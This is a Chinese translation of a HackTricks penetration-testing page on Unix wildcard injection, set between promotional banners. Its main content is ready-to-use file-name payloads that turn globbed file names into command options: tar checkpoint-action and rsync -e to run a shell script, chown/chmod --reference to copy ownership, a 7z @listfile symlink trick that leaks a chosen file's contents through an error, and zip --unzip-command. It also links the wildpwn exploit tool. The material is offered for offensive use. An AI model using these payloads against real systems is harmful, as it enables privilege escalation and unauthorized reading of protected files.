<details>

<summary><strong>从零开始学习AWS黑客技术，成为专家</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE（HackTricks AWS Red Team Expert）</strong></a><strong>！</strong></summary>

其他支持HackTricks的方式：

* 如果您想看到您的**公司在HackTricks中做广告**或**下载PDF格式的HackTricks**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)!
* 获取[**官方PEASS & HackTricks周边产品**](https://peass.creator-spring.com)
* 发现[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)
* **加入** 💬 [**Discord群**](https://discord.gg/hRep4RUj7f) 或 [**电报群**](https://t.me/peass) 或 **关注**我的**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**。**
* 通过向[**HackTricks**](https://github.com/carlospolop/hacktricks)和[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github仓库提交PR来分享您的黑客技巧。

</details>


## chown, chmod

您可以**指定要为其余文件复制的文件所有者和权限**
```bash
touch "--reference=/my/own/path/filename"
```
您可以使用[https://github.com/localh0t/wildpwn/blob/master/wildpwn.py](https://github.com/localh0t/wildpwn/blob/master/wildpwn.py) _(combined attack)_来利用此漏洞\
更多信息请参考[https://www.exploit-db.com/papers/33930](https://www.exploit-db.com/papers/33930)

## Tar

**执行任意命令:**
```bash
touch "--checkpoint=1"
touch "--checkpoint-action=exec=sh shell.sh"
```
您可以使用[https://github.com/localh0t/wildpwn/blob/master/wildpwn.py](https://github.com/localh0t/wildpwn/blob/master/wildpwn.py) _(tar attack)_来利用此漏洞\
更多信息请参考[https://www.exploit-db.com/papers/33930](https://www.exploit-db.com/papers/33930)

## Rsync

**执行任意命令:**
```bash
Interesting rsync option from manual:

-e, --rsh=COMMAND           specify the remote shell to use
--rsync-path=PROGRAM    specify the rsync to run on remote machine
```

```bash
touch "-e sh shell.sh"
```
你可以使用[https://github.com/localh0t/wildpwn/blob/master/wildpwn.py](https://github.com/localh0t/wildpwn/blob/master/wildpwn.py) _(rsync攻击)_ 来利用这个漏洞。\
更多信息请参考[https://www.exploit-db.com/papers/33930](https://www.exploit-db.com/papers/33930)

## 7z

在**7z**中，即使在`*`之前使用`--`（请注意`--`表示以下输入不能被视为参数，因此在这种情况下只能是文件路径），你也可以造成任意错误以读取文件，因此如果类似以下命令正在以root权限执行：
```bash
7za a /backup/$filename.zip -t7z -snl -p$pass -- *
```
并且您可以在执行此操作的文件夹中创建文件，您可以创建文件`@root.txt`和文件`root.txt`作为**符号链接**指向您想要读取的文件：
```bash
cd /path/to/7z/acting/folder
touch @root.txt
ln -s /file/you/want/to/read root.txt
```
然后，当执行**7z**时，它会将`root.txt`视为包含应压缩的文件列表的文件（这就是`@root.txt`存在的意义），当7z读取`root.txt`时，它将读取`/file/you/want/to/read`，**由于此文件的内容不是文件列表，它将抛出错误**并显示内容。

_更多信息请参阅HackTheBox的CTF比赛中的Write-ups。_

## Zip

**执行任意命令：**
```bash
zip name.zip files -T --unzip-command "sh -c whoami"
```
<details>

<summary><strong>从零开始学习AWS黑客技术，成为专家</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE（HackTricks AWS Red Team Expert）</strong></a><strong>！</strong></summary>

其他支持HackTricks的方式：

* 如果您想看到您的**公司在HackTricks中做广告**或**下载PDF格式的HackTricks**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)!
* 获取[**官方PEASS & HackTricks周边产品**](https://peass.creator-spring.com)
* 探索[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)
* **加入** 💬 [**Discord群组**](https://discord.gg/hRep4RUj7f) 或 [**电报群组**](https://t.me/peass) 或 **关注**我的**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**。**
* 通过向[**HackTricks**](https://github.com/carlospolop/hacktricks)和[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github仓库提交PR来分享您的黑客技巧。

</details>
